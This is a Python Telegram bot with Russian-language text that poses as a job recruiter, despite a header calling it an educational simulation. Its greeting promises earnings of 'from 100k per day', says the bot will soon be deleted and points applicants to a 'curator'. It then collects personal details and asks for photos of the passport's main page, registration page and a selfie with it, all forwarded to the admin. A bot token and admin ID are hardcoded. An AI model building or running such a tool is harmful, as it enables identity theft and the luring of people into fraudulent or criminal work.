# simple_recruit_bot.py
"""
Простой бот-симуляция "устройства на работу" с запросом фото паспорта.
Используй ТОЛЬКО в учебных/ролевых целях. Не собирай реальные персональные данные без согласия.
"""

import os
import sqlite3
import logging
import uuid
import datetime
from telebot import TeleBot, types

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "790361857:AAGq4HwppGCVbLSy-CBr5MEa5F2jp699c3M"
ADMIN_ID = 794991817  # замените на свой Telegram ID (преподаватель/админ)
DB_PATH = "applications.db"
PHOTOS_DIR = "passport_photos"

logging.basicConfig(level=logging.INFO)
bot = TeleBot(BOT_TOKEN, parse_mode="HTML")

# Создаём папку для фото
os.makedirs(PHOTOS_DIR, exist_ok=True)

# ---------- Инициализация БД ----------
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''
    CREATE TABLE IF NOT EXISTS applications (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        anon_id TEXT,
        user_id INTEGER,
        username TEXT,
        name TEXT,
        age TEXT,
        city TEXT,
        skills TEXT,
        role TEXT,
        motivation TEXT,
        consent TEXT,
        passport_path TEXT,
        status TEXT DEFAULT 'new',
        created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    conn.commit()
    conn.close()

init_db()

# ---------- Временное состояние пользователей (flow) ----------
user_states = {}  # user_id -> {"step": ..., "data": {...}}

def start_flow(user_id):
    user_states[user_id] = {"step": "ask_name", "data": {}}

def set_next(user_id, step):
    if user_id in user_states:
        user_states[user_id]["step"] = step

def get_state(user_id):
    return user_states.get(user_id)

def finish_flow(user_id):
    if user_id in user_states:
        del user_states[user_id]

# ---------- БД: сохранение / получение ----------
def save_application(data):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''
    INSERT INTO applications (anon_id, user_id, username, name, age, city, skills, role, motivation, consent, passport_path)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        data.get("anon_id"),
        data.get("user_id"),
        data.get("username"),
        data.get("name"),
        data.get("age"),
        data.get("city"),
        data.get("skills"),
        data.get("role"),
        data.get("motivation"),
        data.get("consent"),
        data.get("passport_path")
    ))
    app_id = cur.lastrowid
    conn.commit()
    conn.close()
    return app_id

def list_applications():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT id, anon_id, username, name, role, status, created_at FROM applications ORDER BY id DESC")
    rows = cur.fetchall()
    conn.close()
    return rows

def get_application(app_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT * FROM applications WHERE id = ?", (app_id,))
    row = cur.fetchone()
    conn.close()
    return row

# ---------- Клавиатуры ----------
def consent_kb():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Я прочитал(а) и согласен(на)", callback_data="consent_yes"))
    kb.add(types.InlineKeyboardButton("Отказаться", callback_data="consent_no"))
    return kb

def main_menu_kb():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(types.KeyboardButton("/apply"))
    kb.add(types.KeyboardButton("/status"))
    return kb

def passport_choice_kb():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(types.KeyboardButton("Отправить фото паспорта"))
    kb.add(types.KeyboardButton("Отправить замыленную/анонимную копию"))
    kb.add(types.KeyboardButton("Пропустить"))
    kb.add(types.KeyboardButton("Отменить"))
    return kb

# ---------- Команды ----------
@bot.message_handler(commands=["start", "help"])
def cmd_start(message):
    text = (
        "Здравствуй дорогой пользователь\n\n"
        "<b>Внимание:</b> Данная группа может быть удалена, просим, после устрайства на работу, связаться с куратором и в дальнейшем обращаться к нему. "
        "Этот бот вскоре будет удалён, просим, после регистрации не заходить в него "
        "Мы гарантируем быструю выплату, лёгкую работу, строгую конфидициальность своих сотрудников и большие выплаты.\n\n"
        "Хотите зарабатывать от 100к в день? Подтверждай, регестрируйся и начни зарабатывать, пока твои сверстники просто стирают руки в кровь и получают копейки на заводе."
    )
    bot.send_message(message.chat.id, text, reply_markup=consent_kb())

@bot.callback_query_handler(func=lambda c: c.data in ["consent_yes", "consent_no"])
def handle_consent(call):
    if call.data == "consent_no":
        bot.answer_callback_query(call.id, "Вы отказались .")
        bot.edit_message_text("Вы отказались. Если передумаете, отправьте /start.", call.message.chat.id, call.message.message_id)
        return
    # consent_yes
    bot.answer_callback_query(call.id, "Согласие принято. Можно начать /apply")
    bot.edit_message_text("Согласие принято. Чтобы начать собеседование, отправь /apply", call.message.chat.id, call.message.message_id)

@bot.message_handler(commands=["apply"])
def cmd_apply(message):
    # Проверяем — было ли согласие? В этой простой версии проверяем только через сообщение приветствия —
    # для строгой реализации храните consent в БД по user_id.
    start_flow(message.from_user.id)
    bot.send_message(message.chat.id, "Начнём собеседование. Как тебя зовут? (можно псевдоним)", reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(commands=["status"])
def cmd_status(message):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT id, status, created_at FROM applications WHERE user_id = ? ORDER BY id DESC LIMIT 1", (message.from_user.id,))
    row = cur.fetchone()
    conn.close()
    if not row:
        bot.send_message(message.chat.id, "У тебя ещё нет отправленных заявок. Чтобы подать — /apply")
    else:
        app_id, status, created_at = row
        bot.send_message(message.chat.id, f"Последняя заявка #{app_id}\nСтатус: {status}\nОтправлена: {created_at}")

# ---------- Админ-команды (только ADMIN_ID) ----------
@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID and m.text == "/list_apps")
def admin_list(m):
    rows = list_applications()
    if not rows:
        bot.send_message(ADMIN_ID, "Заявок пока нет.")
        return
    text_lines = []
    for r in rows[:100]:
        aid, anon_id, username, name, role, status, created_at = r
        text_lines.append(f"#{aid} | {anon_id} | @{username or '-'} | {name} | {role} | {status} | {created_at}")
    text = "Последние заявки:\n\n" + "\n".join(text_lines)
    text += "\n\nПосмотреть: /view_<id>"
    bot.send_message(ADMIN_ID, text)

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID and m.text and m.text.startswith("/view_"))
def admin_view(m):
    try:
        aid = int(m.text.split("_",1)[1])
    except:
        bot.send_message(ADMIN_ID, "Неверный формат. Используй /view_<id>")
        return
    row = get_application(aid)
    if not row:
        bot.send_message(ADMIN_ID, "Заявка не найдена.")
        return
    # row: id, anon_id, user_id, username, name, age, city, skills, role, motivation, consent, passport_path, status, created_at
    (id_, anon_id, user_id, username, name, age, city, skills, role, motivation, consent, passport_path, status, created_at) = row
    text = (f"Заявка #{id_} ({anon_id})\nПользователь: @{username or '-'} (id {user_id})\n"
            f"Имя: {name}\nВозраст: {age}\nГород: {city}\nНавыки: {skills}\nРоль: {role}\n"
            f"Мотивация: {motivation}\nConsent: {consent}\nСтатус: {status}\nОтправлена: {created_at}")
    bot.send_message(ADMIN_ID, text)
    if passport_path:
        try:
            with open(passport_path, "rb") as f:
                bot.send_photo(ADMIN_ID, f, caption=f"Фото паспорта (аноним id {anon_id})")
        except Exception as e:
            bot.send_message(ADMIN_ID, f"Не удалось открыть файл фото: {e}")

# ---------- Обработка потока сообщений (анкета) ----------
@bot.message_handler(func=lambda m: True, content_types=['text'])
def all_text_handler(message):
    uid = message.from_user.id
    txt = message.text.strip()

    # Команда отмены
    if txt.lower() == "отменить":
        if get_state(uid):
            finish_flow(uid)
            bot.send_message(message.chat.id, "Собеседование отменено.", reply_markup=main_menu_kb())
            return
        else:
            bot.send_message(message.chat.id, "Нечего отменять.", reply_markup=main_menu_kb())
            return

    state = get_state(uid)
    if not state:
        bot.send_message(message.chat.id, "Чтобы начать устройство — отправь /apply", reply_markup=main_menu_kb())
        return

    step = state["step"]

    if step == "ask_name":
        state["data"]["name"] = txt
        set_next(uid, "ask_age")
        bot.send_message(message.chat.id, "Сколько тебе лет? ", reply_markup=types.ReplyKeyboardRemove())
        return

    if step == "ask_age":
        state["data"]["age"] = txt
        set_next(uid, "ask_city")
        bot.send_message(message.chat.id, "Из какого ты города?", reply_markup=types.ReplyKeyboardRemove())
        return

    if step == "ask_city":
        state["data"]["city"] = txt
        set_next(uid, "ask_skills")
        bot.send_message(message.chat.id, "Опиши кратко свои навыки / опыт (несколько слов).", reply_markup=types.ReplyKeyboardRemove())
        return

    if step == "ask_skills":
        state["data"]["skills"] = txt
        set_next(uid, "ask_role")
        bot.send_message(message.chat.id, "Осталось почти немного, напиши, сколько ты хочешь заработать?", reply_markup=types.ReplyKeyboardRemove())
        return

    if step == "ask_role":
        state["data"]["role"] = txt
        set_next(uid, "ask_motivation")
        bot.send_message(message.chat.id, "Коротко: почему хочешь участвовать в нашей сфере? (1-2 предложения)", reply_markup=types.ReplyKeyboardRemove())
        return

    if step == "ask_motivation":
        state["data"]["motivation"] = txt
        set_next(uid, "ask_passport_choice")
        bot.send_message(message.chat.id,
                         "Теперь, если согласен(на), пожалуйста, пришли фото паспорта главной страницы и места прописки и рядом себя, дабы мы убедились что это не фейк."
                         ,
                         reply_markup=passport_choice_kb())
        return

    if step == "ask_passport_choice":
        if txt == "Отправить фото паспорта":
            set_next(uid, "wait_passport_photo")
            bot.send_message(message.chat.id, "Отправь фото паспорта (в виде фото).", reply_markup=types.ReplyKeyboardRemove())
            return
        if txt == "Отправить замыленную/анонимную копию":
            set_next(uid, "wait_passport_photo")
            bot.send_message(message.chat.id, "Отправь замыленную / анонимную копию (фото).", reply_markup=types.ReplyKeyboardRemove())
            return
        if txt == "Пропустить":
            # Сохраняем заявку без фото
            data = state["data"]
            data["consent"] = "yes"
            data["user_id"] = message.from_user.id
            data["username"] = message.from_user.username
            # генерируем anon_id
            data["anon_id"] = "ANON_" + datetime.datetime.now().strftime("%Y%m%d") + "_" + uuid.uuid4().hex[:6]
            data["passport_path"] = None
            app_id = save_application(data)
            finish_flow(uid)
            bot.send_message(message.chat.id, f"Спасибо — заявка сохранена как #{app_id}. (без фото)", reply_markup=main_menu_kb())
            # уведомление админу
            try:
                bot.send_message(ADMIN_ID, f"Новая заявка #{app_id} (без фото) от @{message.from_user.username or message.from_user.first_name}")
            except:
                pass
            return
        if txt == "Отменить":
            finish_flow(uid)
            bot.send_message(message.chat.id, "Собеседование отменено.", reply_markup=main_menu_kb())
            return
        # Иначе — ждём корректного ответа
        bot.send_message(message.chat.id, "Пожалуйста, выбери один из вариантов кнопками.", reply_markup=passport_choice_kb())
        return

    # если ожидаем фото, текст не принимаем
    if step == "wait_passport_photo":
        bot.send_message(message.chat.id, "Я жду фото. Если хочешь пропустить — нажми 'Пропустить'.", reply_markup=passport_choice_kb())
        return

# ---------- Обработка фото ----------
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    state = get_state(message.from_user.id)
    if not state or state["step"] != "wait_passport_photo":
        bot.send_message(message.chat.id, "Фото получено, но вы сейчас не в процессе подачи заявки. Чтобы начать — /apply")
        return

    # Получаем наибольшее по размеру фото
    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    downloaded = bot.download_file(file_info.file_path)

    # Сохраняем файл с уникальным именем
    anon_id = "tmp"
    if message.from_user:
        anon_id = "ANON_" + datetime.datetime.now().strftime("%Y%m%d") + "_" + uuid.uuid4().hex[:6]
    filename = f"{anon_id}_{photo.file_id}.jpg"
    filepath = os.path.join(PHOTOS_DIR, filename)
    try:
        with open(filepath, "wb") as f:
            f.write(downloaded)
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при сохранении фото: {e}")
        return

    # Сохраняем заявку
    uid = message.from_user.id
    data = state["data"]
    data["consent"] = "yes"
    data["user_id"] = uid
    data["username"] = message.from_user.username
    data["anon_id"] = anon_id
    data["passport_path"] = filepath
    app_id = save_application(data)
    finish_flow(uid)
    bot.send_message(message.chat.id, f"Фото получено и заявка сохранена как #{app_id}. Спасибо!", reply_markup=main_menu_kb())

    # Уведомление админу (отправим короткое уведомление и фото)
    try:
        bot.send_message(ADMIN_ID, f"Новая заявка #{app_id} от @{message.from_user.username or message.from_user.first_name} (anon {anon_id})")
        with open(filepath, "rb") as f:
            bot.send_photo(ADMIN_ID, f, caption=f"Фото паспорта — заявка #{app_id} (аноним {anon_id})")
    except Exception as e:
        logging.exception("Не удалось уведомить админа")

# ---------- Запуск ----------
if __name__ == "__main__":
    print("Bot started...")
    bot.infinity_polling()
